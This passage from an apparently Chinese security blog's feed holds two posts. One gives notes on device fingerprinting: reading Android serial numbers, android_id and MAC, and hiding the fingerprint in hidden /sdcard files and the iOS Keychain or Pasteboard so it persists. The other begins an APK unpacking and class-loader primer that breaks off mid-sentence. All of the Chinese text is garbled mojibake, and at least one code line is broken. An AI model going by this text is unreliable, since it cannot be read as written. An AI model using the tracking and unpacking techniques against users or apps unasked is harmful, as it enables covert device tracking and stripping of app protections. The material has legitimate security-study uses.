ä¸éœ€è¦ç”³è¯·ç›¸åº”æƒé™ï¼Œé«˜ç‰ˆæœ¬ç³»ç»Ÿå­˜åœ¨åŒä¸€ä¸ªè®¾å¤‡ä¸­æ¯ä¸ª                                             åº”ç”¨è·å–çš„å€¼ä¸ç›¸åŒçš„æƒ…å†µ</span><br><span class="line">oaid                 ç§»åŠ¨è”ç›Ÿè®¾å¤‡å”¯ä¸€æ ‡è¯†       ä»…èƒ½è·å–åŠ å…¥ç§»åŠ¨è”ç›Ÿå‚å•†çš„è®¾å¤‡çš„oaid</span><br><span class="line">cid                  SDå¡åºåˆ—å·               ä¸éœ€è¦ç”³è¯·ç›¸åº”æƒé™ï¼Œå­˜åœ¨è·å–å¤±è´¥çš„æƒ…å†µ</span><br><span class="line">android_id           è®¾å¤‡çš„å”¯ä¸€è¯†åˆ«ç           ä¸éœ€è¦ç”³è¯·ç›¸åº”æƒé™,ç›¸åŒå‚å•†åŒå‹å·è®¾å¤‡å­˜åœ¨å°æ¦‚ç‡å‘                                              ç”Ÿå·ç ç¢°æ’</span><br><span class="line"><span class="keyword">mac</span>                  è®¾å¤‡ç½‘å¡çš„<span class="keyword">MAC</span>åœ°å€         éœ€è¦ç”³è¯·ç›¸åº”æƒé™ï¼Œé«˜ç‰ˆæœ¬ç³»ç»Ÿå¯èƒ½éšæœºè¿”å›è™šå‡<span class="keyword">MAC</span>åœ°                                              å€</span><br></pre></td></tr></table></figure><p>è·å–è®¾å¤‡åºåˆ—å·serialnoæ—¶ä¸ç›´æ¥è°ƒç”¨ç³»ç»Ÿçš„æ¥å£ï¼Œè€Œé‡‡ç”¨åå°„çš„æ–¹å¼ï¼Œèƒ½è§£å†³ç³»ç»Ÿä¸æä¾›è°ƒç”¨æ¥å£çš„é—®é¢˜ã€‚</p><ul><li><p>å¦‚æœå½“å‰ç‰ˆæœ¬å¤§äº7.0ï¼Œç›´æ¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StringBuild <span class="type">serial</span> - <span class="built_in">new</span> StringBuild();</span><br><span class="line"><span class="type">serial</span>.append(Build.SERIAL);</span><br></pre></td></tr></table></figure><p>å¦åˆ™è¿›è¡Œåå°„</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; c=<span class="keyword">Class</span>.forName(&quot;android.os.SystemProperties&quot;);</span><br><span class="line"><span class="keyword">Method</span> <span class="keyword">get</span> =c.getMethod(&quot;get&quot;,String.<span class="keyword">class</span>);</span><br><span class="line"><span class="type">serial</span>.append((String)<span class="keyword">get</span>.invoke(c,&quot;ro.serialno&quot;));</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼š</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FILE</span> <span class="comment">*fp;</span></span><br><span class="line"><span class="comment">*serialno = (char *)calloc(128,sizeof(char));</span></span><br><span class="line">fp=p<span class="meta">open</span>(<span class="string">&quot;cat /sys/devices/soc0/serial_number&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">fgets(<span class="comment">*serialno,128,fp);</span></span><br><span class="line">p<span class="meta">close</span>(fp);</span><br></pre></td></tr></table></figure></li></ul><p>è·å–drmuidï¼Œcidï¼Œmacè§ä¹¦160</p><p>å®¢æˆ·ç«¯é‡‡é›†çš„è®¾å¤‡æ•°æ®ç›´æ¥å†³å®šäº†ç”Ÿæˆçš„è®¾å¤‡æŒ‡çº¹æ˜¯å¦ç¨³å®šå’Œå”¯ä¸€æœ‰æ•ˆï¼Œæ‰€ä»¥å¿…é¡»ä¿è¯æ•°æ®ä¸ŠæŠ¥åˆ°æœåŠ¡å™¨è¿‡ç¨‹çš„å®‰å…¨æ€§ï¼Œä¸ºé˜²æ­¢ä¸­é—´äººæ”»å‡»æˆ–è€…æ•°æ®è¢«æ›¿æ¢ï¼Œéœ€è¦ä½¿ç”¨ä¸€æ•´å¥—åŠ å¯†å’Œé€»è¾‘æ ¡éªŒä¿è¯æ•°æ®ä¼ è¾“çš„å®‰å…¨ã€‚</p><p><strong>å®¢æˆ·ç«¯</strong></p><ol><li>ä½¿ç”¨AESå°†é‡‡é›†çš„è®¾å¤‡æ•°æ®è¿›è¡Œæ•´ä½“åŠ å¯†</li><li>ç»“åˆå½“å‰ç”¨æˆ·çš„SESSIONIDè®¡ç®—ä¸€ä¸ªç­¾å</li><li>å°†åŠ å¯†åè®¾å¤‡æ•°æ®å’Œè®¡ç®—å‡ºçš„æ ¡éªŒå€¼è¿›è¡Œæ‹¼æ¥(å¯ä»¥ç”¨ . åˆ†éš”)ï¼Œæ•´ä½“BASE64ä¸Šä¼ è‡³æœåŠ¡ç«¯</li></ol><p><strong>æœåŠ¡ç«¯</strong></p><ol><li>å¯¹æ•°æ®è¿›è¡Œè§£ææ‹†åˆ†ï¼Œå–å‡ºåŠ å¯†åçš„è®¾å¤‡æ•°æ®å’Œå®¢æˆ·ç«¯è®¡ç®—çš„ç­¾å</li><li>åˆ©ç”¨å½“å‰ç”¨æˆ·æŸ¥è¯¢æœåŠ¡ç«¯å­˜å‚¨çš„SESSIONIDï¼Œä½¿ç”¨å’Œå®¢æˆ·ç«¯ä¸€æ ·çš„ç­¾åç®—æ³•å¯¹åŠ å¯†æ•°æ®è¿›è¡Œç­¾å</li><li>å¯¹æ¯”æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„è®¡ç®—ç­¾åæ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™æ­£å¸¸å¯¹ä¸ŠæŠ¥çš„æ•°æ®è¿›è¡Œè§£å¯†ï¼Œå¦åˆ™ä¸¢å¼ƒ</li></ol><h3 id="è®¾å¤‡æŒ‡çº¹ç”Ÿæˆ">è®¾å¤‡æŒ‡çº¹ç”Ÿæˆ</h3><p>ä¸ºäº†ä¿è¯è®¾å¤‡æŒ‡çº¹çš„ç¨³å®šæ€§ï¼Œæ¯æ¬¡ä½¿ç”¨å›ºå®šç®—æ³•ç”Ÿæˆè®¾å¤‡æŒ‡çº¹æ—¶ç›¸å…³å­—æ®µæ‹¼æ¥é¡ºåºè¦ä¿æŒä¸€è‡´ï¼Œä¸èƒ½éšæœºæ›´æ¢ã€‚å¦‚æœç”Ÿæˆè®¾å¤‡æŒ‡çº¹éœ€è¦çš„è®¾å¤‡å‚æ•°è·å–å¤±è´¥æˆ–è€…è·å–çš„ä¸ºæ— æ•ˆå€¼ï¼Œåˆ™ç”¨ç©ºå­—ç¬¦ä¸²æ›¿æ¢è¯¥å€¼ï¼Œæˆ‘ä»¬å°†æ–°ç”Ÿæˆçš„è®¾å¤‡æŒ‡çº¹å‘½åä¸ºSUIDã€‚</p><p>ä¸ºäº†åœ¨æœåŠ¡ç«¯ä¿è¯è®¾å¤‡æŒ‡çº¹çš„ç¨³å®šæ€§ï¼Œè¦å°†æ–°ç”Ÿæˆçš„è®¾å¤‡æŒ‡çº¹å’Œç”Ÿæˆè®¾å¤‡æŒ‡çº¹æ‰€ç”¨çš„æ ¸å¿ƒè®¾å¤‡ç‰¹å¾é€ä¸ªå»ºç«‹æ˜ å°„å…³ç³»ï¼Œå½¢æˆå¤šç»´åº¦çš„æ˜ å°„å…³ç³»å­˜å‚¨çŸ©é˜µã€‚è¿™æ ·æ‰ä¿è¯åœ¨éƒ¨åˆ†è®¾å¤‡ç‰¹å¾å˜åŠ¨åè®¾å¤‡æŒ‡çº¹çš„ç¨³å®šæ€§å’Œå”¯ä¸€æ€§ã€‚</p><p>æ•°æ®åº“å­˜å‚¨çŸ©é˜µçš„ä¸»è¦ç›®çš„æ˜¯åœ¨å®¢æˆ·ç«¯å­˜å‚¨çš„è®¾å¤‡æŒ‡çº¹å¤±æ•ˆæˆ–è€…ä¸¢å¤±åï¼Œèƒ½å¤Ÿæ ¹æ®é‡æ–°ä¸ŠæŠ¥çš„è®¾å¤‡æ•°æ®æŸ¥è¯¢åˆ°æœåŠ¡ç«¯å­˜å‚¨çš„åŸå§‹è®¾å¤‡æŒ‡çº¹ï¼Œä»è€Œä¿è¯è®¾å¤‡æŒ‡çº¹çš„ç¨³å®šæ€§ã€‚</p><h3 id="è®¾å¤‡æŒ‡çº¹éšè—">è®¾å¤‡æŒ‡çº¹éšè—</h3><p>è®¾å¤‡æŒ‡çº¹èƒ½å¤Ÿä¿è¯ç¨³å®šæ€§å’Œå”¯ä¸€æ€§ï¼Œé™¤äº†ä¾èµ–æœåŠ¡ç«¯å¤–ï¼Œè¿˜ä¾èµ–è®¾å¤‡æŒ‡çº¹åœ¨å®¢æˆ·ç«¯çš„å­˜å‚¨é€»è¾‘ã€‚å®¢æˆ·ç«¯æ¯æ¬¡ä½¿ç”¨è®¾å¤‡æŒ‡çº¹æ—¶ä¼šé¦–å…ˆè¯»å–æœ¬åœ°å­˜å‚¨çš„è®¾å¤‡æŒ‡çº¹ï¼Œåªæœ‰æœ¬åœ°è¯»å–å¤±è´¥ï¼Œæ‰ä¼šé‡æ–°è¯·æ±‚æœåŠ¡ç«¯è·å–è®¾å¤‡æŒ‡çº¹ï¼Œé˜²æ­¢é«˜é¢‘ç‡è¯·æ±‚ç»™æœåŠ¡ç«¯å¸¦æ¥å‹åŠ›ã€‚</p><p>å¯¹äºè®¾å¤‡æŒ‡çº¹å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„å®‰å…¨å­˜å‚¨é—®é¢˜ï¼š</p><ul><li>å®¢æˆ·ç«¯æ¥æ”¶åˆ°æœåŠ¡ç«¯ä¸‹å‘çš„è®¾å¤‡æŒ‡çº¹åå¯¹å…¶è¿›è¡ŒåŠ å¯†å¤„ç†ï¼ŒåŒæ—¶è·å–å½“å‰çš„æ—¶é—´æˆ³ç»“åˆåŠ å¯†åçš„è®¾å¤‡æŒ‡çº¹ç”Ÿæˆç”¨äºé˜²ç¯¡æ”¹çš„ç­¾åã€‚å°†åŠ å¯†åçš„è®¾å¤‡æŒ‡çº¹ï¼Œé˜²ç¯¡æ”¹ç­¾åå’Œç”Ÿæˆç­¾åä½¿ç”¨çš„æ—¶é—´æˆ³æ•´ä½“base64ï¼Œæœ€åå°†å¤„ç†åçš„è®¾å¤‡æŒ‡çº¹éšè—å½“å‰è®¾å¤‡ã€‚</li></ul><p>Android<strong>çš„éšè—è·¯å¾„</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/Android/.backup/.config             æ²™ç®±æ ¹ç›®å½•åˆ›å»ºéšè—æ–‡ä»¶</span><br><span class="line">/sdcard/DCIM/.config                        ç›¸å†Œæ‰€åœ¨ç›®å½•åˆ›å»ºéšè—æ–‡ä»¶</span><br><span class="line">/sdcard/.tconfig                            sdcardæ ¹ç›®å½•åˆ›å»ºéšè—æ–‡ä»¶</span><br><span class="line">/sdcard/.SystemConfig/.backup/.config       sdcardæ ¹ç›®å½•åˆ›å»ºéšè—æ–‡ä»¶</span><br><span class="line">/sdcard/Android/data/åŒ…å/.backup/.config    åº”ç”¨æ²™ç®±ç›®å½•åˆ›å»ºéšè—æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><strong>IOSéšè—è·¯å¾„</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Preferenecsæ–‡ä»¶ </span>          åº”ç”¨çš„<span class="keyword">Preferenceå±æ€§è®¾ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="keyword"></span>KeyChain                 é’¥åŒ™ä¸²ï¼Œè‹¹æœå…¬å¸çš„å¯†ç ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">Pasteboard               å°†è¦ä¿æŠ¤çš„æ•°æ®éšè—åœ¨å‰ªè´´æ¿</span><br></pre></td></tr></table></figure><h3 id="è®¾å¤‡æŒ‡çº¹åº”ç”¨">è®¾å¤‡æŒ‡çº¹åº”ç”¨</h3><p><strong>å®¢æˆ·ç«¯</strong></p><p>å½“å®¢æˆ·ç«¯ä½¿ç”¨è®¾å¤‡æŒ‡çº¹æ—¶ï¼Œé¦–å…ˆå°è¯•é€šè¿‡å®¢æˆ·ç«¯æ¨¡å—è·å–éšè—åœ¨ç¨‹åºç›®å½•æˆ–è®¾å¤‡ä¸­çš„è®¾å¤‡æŒ‡çº¹ï¼Œå½“è®¾å¤‡ä¸­ä¸å­˜åœ¨éšè—çš„è®¾å¤‡æŒ‡çº¹æˆ–è€…éšè—è®¾å¤‡æŒ‡çº¹ä¸ºæ— æ•ˆå€¼æ—¶ï¼Œå°è¯•é€šè¿‡æœåŠ¡ç«¯è·å–è®¾å¤‡æŒ‡çº¹</p><p>è®¾å¤‡æŒ‡çº¹ç³»ç»Ÿä¸­çš„å®¢æˆ·ç«¯éƒ¨åˆ†ç”¨äºä¿è¯æœåŠ¡ç«¯å°†è®¾å¤‡æŒ‡çº¹ä¸‹å‘åˆ°å®¢æˆ·ç«¯åçš„ç¨³å®šæ€§ï¼ŒåŒæ—¶ä¿è¯ç”Ÿæˆè®¾å¤‡æŒ‡çº¹æ‰€ç”¨ç‰¹å¾å€¼çš„ç¨³å®šæ€§ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡ä½¿ç”¨è®¾å¤‡æŒ‡çº¹æ—¶é¦–å…ˆè¦è·å–åœ¨è®¾å¤‡æœ¬åœ°éšè—çš„è®¾å¤‡æŒ‡çº¹ï¼Œå½“è®¾å¤‡æœ¬åœ°æ²¡æœ‰è®¾å¤‡æŒ‡çº¹æˆ–è€…è®¾å¤‡æŒ‡çº¹æ— æ•ˆæ—¶ï¼Œå°±éœ€è¦è¯·æ±‚æœåŠ¡ç«¯è·å–æ–°çš„è®¾å¤‡æŒ‡çº¹ã€‚æœåŠ¡ç«¯å­˜å‚¨äº†è®¾å¤‡æŒ‡çº¹å’Œè®¾å¤‡ç‰¹å¾å€¼æ˜ å°„å…³ç³»ï¼Œé€šè¿‡è®¾å¤‡ç‰¹å¾å€¼æŸ¥è¯¢åˆ°å½“å‰è®¾å¤‡çš„è®¾å¤‡æŒ‡çº¹ï¼Œå½“æœåŠ¡ç«¯æŸ¥è¯¢ä¸åˆ°å½“å‰è®¾å¤‡ç‰¹å¾å€¼å¯¹åº”çš„è®¾å¤‡æŒ‡çº¹æ—¶ï¼Œå°±ä½¿ç”¨ä¸ŠæŠ¥çš„è®¾å¤‡ç‰¹å¾å€¼é‡æ–°ç”Ÿæˆæ–°çš„è®¾å¤‡æŒ‡çº¹ï¼Œè¿™å°±éœ€è¦ä¿è¯è®¾å¤‡ç‰¹å¾å€¼ä¸ä¼šéšæ„å˜åŒ–ï¼Œæ¯æ¬¡è·å–è®¾å¤‡ç‰¹å¾å€¼æ—¶éƒ½è¦é¦–å…ˆè¯»å–è®¾å¤‡ä¸­éšè—çš„ç‰¹å¾å€¼ï¼Œåªæœ‰æ— æ³•è¯»å–åˆ°éšè—çš„ç‰¹å¾å€¼æ—¶æ‰ä¼šé‡æ–°è·å–ã€‚</p><p><strong>æœåŠ¡ç«¯</strong></p><p>æœåŠ¡ç«¯ä¸»è¦ä½œç”¨å°±æ˜¯ç”Ÿæˆè®¾å¤‡æŒ‡çº¹å’Œä¿è¯è®¾å¤‡æŒ‡çº¹çš„ç¨³å®šæ€§ï¼Œå½“æœåŠ¡ç«¯ç”Ÿæˆæ–°çš„è®¾å¤‡æŒ‡çº¹æ—¶ï¼Œé™¤äº†éœ€è¦å­˜å‚¨è®¾å¤‡æŒ‡çº¹ï¼ŒåŒæ—¶å­˜å‚¨å®ƒå’Œè®¾å¤‡ç‰¹å¾æ˜ å°„å…³ç³»ã€‚å­˜å‚¨çš„æ˜ å°„å…³ç³»ä¸­æ¯æ¡è®°å½•éƒ½ä¼šæœ‰3ä¸ªåŸºå‡†è®¾å¤‡ç‰¹å¾å€¼(screenï¼Œmodel,memory)å’Œæ ¸å¿ƒè®¾å¤‡ç‰¹å¾å€¼ã€‚Androidçš„æ ¸å¿ƒç‰¹å¾å€¼imei,serialno,drmuid,cid,android_idmacï¼Œiosè®¾å¤‡æ ¸å¿ƒç‰¹å¾å€¼idfv,idfa,uuid</p><p>æœåŠ¡ç«¯æŸ¥è¯¢ç»“æœæ•°é‡å’Œæ ¸å¿ƒç‰¹å¾æ•°é‡å¯¹åº”ï¼Œè®¾å¤‡æŒ‡çº¹ç¨³å®šæ€§å°±æ˜¯ä¾èµ–è¿™äº›æŸ¥è¯¢ç»“æœå®ç°çš„ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœæ‰€æœ‰æŸ¥è¯¢ç»“æœä¸­åŒ¹é…çš„æ ¸å¿ƒç‰¹å¾æ•°é‡ä¸åŒï¼Œåˆ™ä»¥åŒ¹é…æ•°é‡æœ€å¤šçš„æŸ¥è¯¢ç»“æœä¸ºå‡†ï¼Œå–å…¶å¯¹åº”è®¾å¤‡æŒ‡çº¹</li><li>å¦‚æœæ‰€æœ‰æŸ¥è¯¢ç»“æœä¸­åŒ¹é…çš„æ ¸å¿ƒç‰¹å¾æ•°é‡ç›¸åŒï¼Œåˆ™æŒ‰æ ¸å¿ƒç‰¹å¾å€¼æƒé‡ç­‰çº§è¿›è¡Œç­›é€‰</li><li>å¦‚æœæ‰€æœ‰æŸ¥è¯¢ç»“æœä¸­éƒ½æ²¡åŒ¹é…åˆ°æ ¸å¿ƒç‰¹å¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªæ–°è®¾å¤‡ï¼Œç”¨ç‰¹å¾å€¼ç”Ÿæˆè®¾å¤‡æŒ‡çº¹ã€‚</li></ul><p>Androidè®¾å¤‡æ ¸å¿ƒç‰¹å¾å€¼æƒé‡ç­‰çº§ï¼šandroid_id&gt;serialno&gt;drmuid&gt;mac&gt;sdcard</p><p>IOSè®¾å¤‡æ ¸å¿ƒç‰¹å¾å€¼æƒé‡ç­‰çº§:idfa&gt;idfv&gt;uuid</p>]]></content>
    
    
    <summary type="html">ğŸ¥§é˜…è¯»ã€ŠAppå®‰å…¨å®æˆ˜æŒ‡å—ã€‹è®°å½•çš„ä¸€äº›å°ä¸œè¥¿</summary>
    
    
    
    <category term="é˜…è¯»" scheme="https://zxk1ng.github.io/categories/%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="é˜…è¯»" scheme="https://zxk1ng.github.io/tags/%E9%98%85%E8%AF%BB/"/>
    
    <category term="ç§»åŠ¨å®‰å…¨" scheme="https://zxk1ng.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>åˆ·æœºä¸è„±å£³æœºå…¥é—¨</title>
    <link href="https://zxk1ng.github.io/posts/e65d2ab6.html"/>
    <id>https://zxk1ng.github.io/posts/e65d2ab6.html</id>
    <published>2025-01-15T06:45:58.000Z</published>
    <updated>2025-01-15T07:14:39.068Z</updated>
    
    <content type="html"><![CDATA[<h1>å‰ç½®çŸ¥è¯†</h1><p>æŸè„±å£³åœ¨çº¿ç½‘ç«™ï¼š<a href="https://nop.gs/">APKåŠ å›ºå®‰å…¨æµ‹è¯• (nop.gs)</a></p><p><code>grep -ril &quot;MainActivity&quot; /*.txt</code></p><p>åœ¨æŒ‡å®šç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ä¸­æœç´¢ï¼Œè¿‡æ»¤</p><ul><li>xjbç§»æ¤åˆ°Android 10ä¸­çš„fartï¼Œåœ¨æŠ½å–è„±å£³æ—¶å‡ºç°.binå’Œ.dexæ–‡ä»¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åˆå¹¶</li></ul><p><code>java -jar dexfixer.jar dexpath binpath outdexpath</code></p><ul><li>å¦‚ä½•å·¥ç¨‹æ‰“åŒ…jaråŒ…<br>File-&gt;Project Structure-&gt;Artifacts-&gt;â€˜+â€™-&gt;JAR-&gt;From modules with<img src="/posts/e65d2ab6.htm/image-20240127170637673.png" alt="image-20240127170637673"></li></ul><p>ç„¶åBuild-&gt;Build Artifactsï¼Œç„¶ååœ¨å·¦ä¾§classesæ–‡ä»¶å¤¹æ‰¾ç”Ÿæˆçš„jaråŒ…</p><h2 id="ç±»åŠ è½½å™¨">ç±»åŠ è½½å™¨</h2><h3 id="JVMçš„ç±»åŠ è½½å™¨åŒ…æ‹¬3ç§ï¼š"><strong>JVMçš„ç±»åŠ è½½å™¨åŒ…æ‹¬3ç§ï¼š</strong></h3><p>1ï¼‰Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</p><p>C/C++ä»£ç å®ç°çš„åŠ è½½å™¨ï¼Œç”¨äºåŠ è½½æŒ‡å®šçš„JDKçš„æ ¸å¿ƒç±»åº“ï¼Œæ¯”å¦‚java.lang.ã€java.uti.ç­‰è¿™äº›ç³»</p><p>ç»Ÿç±»ã€‚Javaè™šæ‹Ÿæœºçš„å¯åŠ¨å°±æ˜¯é€šè¿‡Bootstrap ï¼Œè¯¥Classloaderåœ¨javaé‡Œæ— æ³•è·å–ï¼Œè´Ÿè´£åŠ è½½/libä¸‹çš„</p><p>ç±»ã€‚</p><p>2ï¼‰Extensions ClassLoaderï¼ˆæ‹“å±•ç±»åŠ è½½å™¨ï¼‰</p><p>Javaä¸­çš„å®ç°ç±»ä¸ºExtClassLoaderï¼Œæä¾›äº†é™¤äº†ç³»ç»Ÿç±»ä¹‹å¤–çš„é¢å¤–åŠŸèƒ½ï¼Œå¯ä»¥åœ¨javaé‡Œè·å–ï¼Œ</p><p>è´Ÿè´£åŠ è½½/lib/extä¸‹çš„ç±»ã€‚</p><p>3ï¼‰Application ClassLoaderï¼ˆåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ï¼‰</p><p>Javaä¸­çš„å®ç°ç±»ä¸ºAppClassLoaderï¼Œæ˜¯ä¸æˆ‘ä»¬æ¥è§¦æœ€å¤šçš„ç±»åŠ è½½å™¨ï¼Œå¼€å‘äººå‘˜å†™çš„ä»£ç é»˜è®¤</p><p>å°±æ˜¯ç”±å®ƒæ¥åŠ è½½ï¼ŒClassLoader.getSystemClassLoaderè¿”å›çš„å°±æ˜¯å®ƒ</p><p>ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œåªéœ€è¦é€šè¿‡ç»§æ‰¿java.lang.ClassLoaderç±»çš„æ–¹å¼æ¥å®ç°è‡ªå·±çš„ç±»åŠ è½½å™¨å³å¯ã€‚</p><p>ClassLoaderçš„ç»§æ‰¿å…³ç³»</p><h3 id="åŠ è½½é¡ºåº"><strong>åŠ è½½é¡ºåº</strong></h3><p>æˆ‘ä»¬çœ‹åˆ°äº†ç³»ç»Ÿçš„3ä¸ªç±»åŠ è½½å™¨ï¼Œä½†æˆ‘ä»¬å¯èƒ½ä¸çŸ¥é“å…·ä½“åŠ è½½çš„é¡ºåºå‘¢ï¼Ÿ</p><p>\1. Bootstrap CLassloder</p><p>\2. Extention ClassLoader</p><p>\3. AppClassLoader<img src="/posts/e65d2ab6.htm/image-20240123232152530.png" alt="image-20240123232152530"></p><h2 id="åŒäº²å§”æ´¾">åŒäº²å§”æ´¾</h2><p>åŒäº²å§”æ´¾æ¨¡å¼çš„å·¥ä½œåŸç†çš„æ˜¯ï¼šå¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½è¯·æ±‚ï¼Œå®ƒå¹¶ä¸ä¼šè‡ªå·±å…ˆå»åŠ è½½ï¼Œè€Œæ˜¯æŠŠ</p><p>è¿™ä¸ªè¯·æ±‚å§”æ‰˜ç»™çˆ¶ç±»çš„åŠ è½½å™¨å»æ‰§è¡Œï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å™¨è¿˜å­˜åœ¨å…¶çˆ¶ç±»åŠ è½½å™¨ï¼Œåˆ™è¿›ä¸€æ­¥å‘ä¸Šå§”æ‰˜ï¼Œä¾æ¬¡é€’</p><p>å½’ï¼Œè¯·æ±‚æœ€ç»ˆå°†åˆ°è¾¾é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å™¨å¯ä»¥å®Œæˆç±»åŠ è½½ä»»åŠ¡ï¼Œå°±æˆåŠŸè¿”å›ï¼Œå€˜è‹¥çˆ¶ç±»</p><p>åŠ è½½å™¨æ— æ³•å®Œæˆæ­¤åŠ è½½ä»»åŠ¡ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ï¼Œè¿™å°±æ˜¯åŒäº²å§”æ´¾æ¨¡å¼ï¼Œå³æ¯ä¸ªå„¿å­éƒ½ä¸æ„¿æ„</p><p>å¹²æ´»ï¼Œæ¯æ¬¡æœ‰æ´»å°±ä¸¢ç»™çˆ¶äº²å»å¹²ï¼Œç›´åˆ°çˆ¶äº²è¯´è¿™ä»¶äº‹æˆ‘ä¹Ÿå¹²ä¸äº†æ—¶ï¼Œå„¿å­è‡ªå·±æƒ³åŠæ³•å»å®Œæˆï¼Œè¿™ä¸ªå°±æ˜¯åŒ</p><p>äº²å§”æ´¾ã€‚</p><p>ä¸ºä»€ä¹ˆè¦æœ‰åŒäº²å§”æ´¾ï¼Ÿ</p><p>1ï¼‰é¿å…é‡å¤åŠ è½½ï¼Œå¦‚æœå·²ç»åŠ è½½è¿‡ä¸€æ¬¡Classï¼Œå¯ä»¥ç›´æ¥è¯»å–å·²ç»åŠ è½½çš„Class</p><p>2ï¼‰æ›´åŠ å®‰å…¨ï¼Œæ— æ³•è‡ªå®šä¹‰ç±»æ¥æ›¿ä»£ç³»ç»Ÿçš„ç±»ï¼Œå¯ä»¥é˜²æ­¢æ ¸å¿ƒAPIåº“è¢«éšæ„ç¯¡æ”¹</p><p><strong>ç±»åŠ è½½çš„æ—¶æœºï¼š</strong></p><p>1ã€éšå¼åŠ è½½ï¼š</p><p>åˆ›å»ºç±»çš„å®ä¾‹</p><p>è®¿é—®ç±»çš„é™æ€å˜é‡ï¼Œæˆ–è€…ä¸ºé™æ€å˜é‡èµ‹å€¼</p><p>è°ƒç”¨ç±»çš„é™æ€æ–¹æ³•</p><p>ä½¿ç”¨åå°„æ–¹å¼æ¥å¼ºåˆ¶åˆ›å»ºæŸä¸ªç±»æˆ–æ¥å£å¯¹åº”çš„java.lang.Classå¯¹è±¡</p><p>åˆå§‹åŒ–æŸä¸ªç±»çš„å­ç±»</p><p>ç³»ç»Ÿè¿›è¡ŒåŠ è½½</p><p>2ã€æ˜¾ç¤ºåŠ è½½ï¼šä¸¤è€…åˆæœ‰æ‰€åŒºåˆ«</p><p>ä½¿ç”¨LoadClassï¼ˆï¼‰åŠ è½½ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œç¬¬äºŒä¸ªæ˜¯true/falseï¼Œä¸å†™é»˜è®¤false ==ã€‹ä¸åˆå§‹åŒ–ç±»</p><p>ä½¿ç”¨forNameï¼ˆï¼‰åŠ è½½ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼šï¼ˆç±»åï¼ŒClassLoaderï¼‰ï¼Œä¼šåˆå§‹åŒ–ç±»</p><p><strong>é€šè¿‡æºç åˆ†æAndroidä¸‹ç±»åŠ è½½çš„æµç¨‹</strong></p><p>1ã€åŠ è½½ï¼šæŸ¥æ‰¾å’Œå¯¼å…¥Classæ–‡ä»¶</p><p>2ã€è¿æ¥ï¼šå…¶ä¸­è§£ææ­¥éª¤æ˜¯å¯ä»¥é€‰æ‹©çš„</p><p>ï¼ˆaï¼‰éªŒè¯ï¼šæ£€æŸ¥è½½å…¥çš„classæ–‡ä»¶æ•°æ®çš„æ­£</p><p>ç¡®æ€§</p><p>ï¼ˆbï¼‰å‡†å¤‡ï¼šç»™ç±»çš„é™æ€å˜é‡åˆ†é…å­˜å‚¨ç©ºé—´</p><p>ï¼ˆcï¼‰è§£æï¼šå°†ç¬¦å·å¼•ç”¨è½¬æˆç›´æ¥å¼•ç”¨</p><p>3ã€åˆå§‹åŒ–ï¼šå³è°ƒç”¨<clinit>å‡½æ•°ï¼Œå¯¹é™æ€å˜é‡ï¼Œé™æ€ä»£ç å—æ‰§è¡Œåˆå§‹åŒ–å·¥ä½œ</clinit></p><p><img src="/posts/e65d2ab6.htm/image-20240123232507241.png" alt="image-20240123232507241"></p><h2 id="Androidç±»åŠ è½½å™¨"><strong>Androidç±»åŠ è½½å™¨</strong></h2><p>Androidç³»ç»Ÿä¸­çš„</p><p>ClassLoaderçš„ç»§æ‰¿å…³ç³»</p><p>å…¶ä¸­ï¼ŒInMemoryDexClassLoaderä¸º</p><p>Android8.0æ–°å¼•å…¥çš„ClassLoader<img src="/posts/e65d2ab6.htm/image-20240123232543680.png" alt="image-20240123232543680"></p><p>Androidç³»ç»Ÿä¸­ä¸ClassLoaderç›¸å…³çš„ä¸€å…±æœ‰8ä¸ªï¼š</p><p>ClassLoaderä¸ºæŠ½è±¡ç±»ï¼›</p><p>BootClassLoaderé¢„åŠ è½½å¸¸ç”¨ç±»ï¼Œå•ä¾‹æ¨¡å¼,ç”¨æ¥åŠ 